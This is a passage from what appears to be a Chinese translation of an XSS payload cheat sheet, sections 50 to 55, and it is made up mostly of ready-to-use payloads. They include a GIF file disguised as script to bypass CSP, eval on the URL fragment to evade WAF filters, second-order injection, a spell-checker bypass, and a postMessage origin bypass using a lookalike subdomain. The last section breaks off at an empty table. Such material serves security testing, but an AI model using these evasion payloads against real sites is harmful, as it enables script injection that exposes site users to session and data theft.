
### 50. File Upload Injection – HTML/JS GIF Disguise（文件上传注入：HTML/JS GIF 伪装）

以下 `payload` 用于通过文件上传绕过 `CSP` 限制。将下面的所有内容保存为 `"xss.gif"` 或 `"xss.js"`（用于严格的 `MIME` 检查）。这是 PHP 的 `image/gif` 文件，它可以通过 `<link rel=import href=xss.gif>`（也称为 `"xss.js"`）或 `<script src=xss.js></script>` 导入到目标 Web 应用。

| 序号 | Payload |
| --- | --- |
| 1、2 | `GIF89a//<script>alert(1)//</script>;` |

### 51. Jump to URL Fragment（URL 分段跳转）

例如，当我们需要在 `payload` 中隐藏一些会触发 `WAF` 的关键字符时，可以在 URL 片段（`#`）之后使用各自的 `payload` 进行绕过。

| 序号 | Payload |
| --- | --- |
| 1、2、3 | `eval(URL.slice(-8))` `#alert(1)`；`eval(location.hash.slice(1))` `#alert(1)`；`document.write(decodeURI(location.hash))` `#<img/src/onerror=alert(1)>` |

### 52. Second Order XSS Injection（二阶 XSS 注入）

当我们的输入内容将会被使用两次时，例如存储在数据库中，然后进行检索以供后面使用或插入到 DOM 中时，使用以下的 `payload` 进行测试。

| 序号 | Payload |
| --- | --- |
| 1 | `&lt;svg/onload=alert(1)&gt;` |

### 53. PHP Spell Checker Bypass（PHP 拼写检查绕过）

以下 `payload` 用于绕过 PHP 的 `pspell_new()` 函数，该函数提供一个字典来尝试猜测用于搜索的输入。

| 序号 | Payload |
| --- | --- |
| 1 | `<scrpt>confirm(1)</scrpt>` |

### 54. Event Origin Bypass for `postMessage()` XSS（`postMessage()` 事件源 XSS 绕过）

以下 `payload` 用于在目标的 `javascript` 代码中可以绕过对源代码的检查时进行测试，将允许的源代码检查参数用于发送 `payload` 攻击域的子域。在本地主机上使用 `CrossPwn` 脚本作为示例（在附加部分中进行提供）。

| 序号 | Payload |
| --- | --- |
| 1、2 | `http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/` `status.html&msg=<script>alert(1)</script>` |

### 55. CSP Bypass（for Whitelisted Google Domains）（CSP 绕过：通过谷歌白名单域名）

以下 `payload` 用于存在允许这些白名单域执行 `CSP`（内容安全策略）时的场景。

| 序号 | Payload |
| --- | --- |
